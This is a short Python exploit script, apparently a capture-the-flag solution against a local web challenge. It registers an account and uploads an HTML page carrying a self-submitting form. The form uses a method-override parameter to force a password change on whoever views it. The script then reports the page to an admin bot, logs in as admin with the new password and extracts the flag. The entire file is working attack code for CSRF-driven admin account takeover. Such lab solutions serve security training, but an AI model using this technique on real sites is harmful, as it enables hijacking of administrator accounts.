#!/usr/bin/env python3
import requests, sys, re, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:13337"
PW = "HackedPass1!"

s = requests.Session()
s.post(f"{BASE}/register", data={"username": "attacker", "password": "attack123", "confirm": "attack123"})
s.post(f"{BASE}/login", data={"username": "attacker", "password": "attack123"})

exploit = '<form id=f method=POST action="/account/change-password?_method=GET"><input name=password value={0}><input name=confirm value={0}></form><script>f.submit()</script>'.format(PW)
path = s.post(f"{BASE}/pages/upload", data={"html": exploit}, headers={"Accept": "application/json"}).json()["url"]

s.post(f"{BASE}/report", data={"url": path})
time.sleep(8)

s2 = requests.Session()
s2.post(f"{BASE}/login", data={"username": "admin", "password": PW})
flag = re.search(r"(L3AK\{[^}]+\})", s2.get(f"{BASE}/flag").text)
print(flag.group(1) if flag else "FAILED")
